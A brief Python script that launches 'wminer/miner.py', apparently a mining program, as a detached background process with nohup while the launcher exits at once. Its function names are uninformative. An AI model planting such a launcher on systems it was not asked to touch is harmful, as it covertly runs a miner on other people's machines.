import subprocess
from multiprocessing import Process
import threading
import time
from sys import exit


def lonc():
    subprocess.run(["bash","-c","nohup python wminer/miner.py &"])

def oo():
    
    exit()
    
t1 = Process(target=lonc, args=())
t2 = threading.Thread(target=oo, args=())
t2.start()
t1.start()
    
    
